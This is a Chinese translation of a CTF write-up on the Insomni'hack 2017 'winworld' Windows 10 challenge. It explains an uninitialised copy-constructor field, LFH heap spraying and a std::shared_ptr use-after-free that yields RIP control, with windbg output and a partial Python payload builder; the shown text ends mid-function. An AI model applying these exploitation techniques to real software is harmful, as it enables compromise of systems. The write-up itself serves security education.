# 【技术分享】在Windows10中利用一个误用的C++共享指针
|
##### 译文声明
本文是翻译文章，文章来源：blog.scrt.ch
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
翻译：[myswsun](http://bobao.360.cn/member/contribute?uid=2775084127)
预估稿费：200RMB
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**0x00 前言**
在本文中，我描述了我的“winworld”挑战的一个详细的解决方案，这个挑战来自Insomni’hack CTF Teaser
2017。Winworld是一个使用C++11编写的x64的Windows二进制文件，并且包含了大部分Windows
10内置的保护措施，特别是AppContainer([
**AppJailLauncher**](https://github.com/trailofbits/AppJailLauncher)
)、执行流保护和最新的缓解策略。
这些能使用Process Hacker快速的验证（也要注意保留的2TB的CFGBitmap）：
这个任务运行在Windows Server 2016上面，挑战的行为与Windows
10一致，甚至使用了相同的库。这个挑战和描述能在[这里](https://github.com/Insomnihack/Teaser-2017/tree/master/winworld)找到。
**  
**
**0x01 二进制的逻辑**
我们的今年的主题是“机器的风险”；winworld是最新的Westworls
TV秀，并实现了一个“narrator”接口，你能够创建机器人和人类，配置他们的行为，并且在地图上面移动他们。
这个narrator操作Person对象，这个对象是“hosts”（robots）和“guests”（humans）的共享类。每个类型存储在独立的列表中。
每个Person对象有下面的属性：
这个narrator暴露了下面的命令：
    --[ Welcome to Winworld, park no 1209 ]--    narrator [day 1]$ help
    Available commands:
     - new   
     - clone  
     - list 
     - info 
     - update   
     - friend   
     - sentence   
     - map
     - move  {+}
     - random_move
     - next_day
     - help
     - prompt 
     - quit
    narrator [day 1]$
在调用move或者random_move时行为发生，2个人相遇了。这个onEncounter方法指针被调用，他们能交互。只有攻击实际对其他Person对象有影响：如果攻击成功了，其他对象可能损坏或者死亡。Robots会永久死亡但是不能杀死humans。Humans只能活一次并且能杀死其他humans。next_day功能能复活robots的生命和恢复每个人的健康，但是如果对象是一个死人，将会被移除出列表。
People使用马尔可夫链的自动的方式交流，这种方式使用Westworld脚本初始化和添加句子，这个可能会发生有趣的对话。许多句子不能一直有效，因为有漏洞存在，我在描述中指定了它，以节省一些逆向的时间（已经有大量的C
++逆向了）。
**  
**
**0x02 弱点1：在Person中复制构造函数未初始化属性**
在narrator初始化期间，map随机生成并且一个特定的点被选作“maze
center”，当某些特定条件达到时，机器人将转变为人类。这个条件是当前移动的Person必须是HOST，设置了is_conscious，并且必须有一个人类（GUEST）在maze
center。
第一件事是找到这个点。所有的随机数据能使用rand()获得，并且这个种子使用经典的srand(time(NULL))来初始化。因此这个种子能通过几次尝试来确定。一旦同步了服务器的时钟，在利用中简单的重放初始化算法能允许找到用来生成maze
center的rand()的值。编写一个简单的路径查找算法来使每个人都到这个位置。
机器人通过Person::Person构造函数中的is_conscious=false来初始化。然而这个Person::Person的拷贝构造函数被narrator的clone函数使用了，但是忘记了初始化。这个值将是未初始化的，并可以使用堆上面已有的内容。结果是克隆一个机器人足以使的is_conscious!=0，但是我们需要确保它是。
有时新克隆的机器人将在LFH中，有时不是。最好是通过克隆0x10减去当前的Person对象数（6）来确保总是在LFH中。让我们克隆6+1次并在windbg中检验：
    0:004> ? winworld!Person::Person
    Matched: 00007ff7`9b9ee700 winworld!Person::Person ()
    Matched: 00007ff7`9b9ee880 winworld!Person::Person ()
    Ambiguous symbol error at 'winworld!Person::Person'
    0:004> bp 00007ff7`9b9ee880 "r rcx ; g" ; bp winworld!Person::printInfos ; g
    rcx=0000024a826a3850
    rcx=0000024a826800c0rcx=0000024a82674130
    rcx=0000024a82674310
    rcx=0000024a82673a50
    rcx=0000024a82673910
    rcx=0000024a82673d70Breakpoint 1 hit
    winworld!Person::printInfos:
    00007ff7`9b9f0890 4c8bdc mov r11,rsp
    0:000> r rcx
    rcx=0000024a82673d700:000> !heap -x 0000024a826800c0Entry User Heap Segment Size PrevSize Unused Flags
    -------------------------------------------------------------------------------------------------------------    0000024a826800b0 0000024a826800c0 0000024a82610000 0000024a82610000 a0 120 10 busy 
    0:000> !heap -x 0000024a82673d70Entry User Heap Segment Size PrevSize Unused Flags
    -------------------------------------------------------------------------------------------------------------    0000024a82673d60 0000024a82673d70 0000024a82610000 0000024a828dec10 a0 - 10 LFH;busy
在这里我们能看到头2个不在LFH中，其他的都在。
LFH分配是随机的，增加了一些挑战。然而这些分配使用大小为0x100的数组随机化，其位置以模数0x100递增，这意味着如果我们喷射正确大小的0x100个元素，我们将回到相同的位置，从而获得确定性行为。我们甚至不需要保证内存块，因此我们能简单的使用0x90大小（和Person一样）的命令字符串来喷射，它总是为clone操作初始化is_conscious属性。
现在我们的机器人变成了人类，并且麻烦再次开始！
注意：似乎Visual Studio
2015默认开启了/sdl编译标记，这将添加memset函数来将分配的Person对象填充为0，因此变得不可利用。我禁用了它，但为了公平起见，我开启了不是默认的CFG！
**  
**
**0x03 弱点2：误用了std::shared_ptr**
共享指针是一个对象指针的简单封装。它特别添加了引用计数，在shared_ptr关联了新的变量时会增加计数，当释放了变量会减少计数。当引用计数变为0时，引用对象将不会存在，因此它自动释放它。针对UAF漏洞这个特别有效。
在这个挑战中，当机器人变成人类，它还保留在robtots列表中（但是它的is_enable字段变为false，因此不能再作为机器人了），并且被插入到humans列表中：
这是非常错误的，因为不是增加对象的shared_str的引用计数，我们创建了一个新的shared_str只想一个相同的对象：
当任意两个shared_ptr的引用计数降为0，这个对象被释放，并且因为其他shared_ptr还存活着，我们还是可以利用UAF漏洞！为了做到这个，我们能杀掉human-robot来使用另一个人类。我们也不得不移除他所有的朋友，否则引用计数不会为0。然后当它从guests向量中移除了指针时，使用next_day方法释放它：
现在得到RIP是简单的，因为对象拥有一个方法指针：使用一个假对象来喷射长度0x90的0x100个字符串，这个对象是std::string能包含空字节，然后将死掉的human-robot右移，他将再次遇到他的杀手，并触发覆盖onEncounter的方法指针：
    def craft_person(func_ptr, leak_addr, size):
     payload = struct.pack("<Q", func_ptr) # func pointer
     payload += "x00" * 24 # friends std::vector
     payload += "x00" * 24 # sentences std::vector
     # std::string name
     payload += struct.pack("<Q", leak_addr)
     payload += "JUNKJUNK"
     payload += struct.pack("<Q", size) # size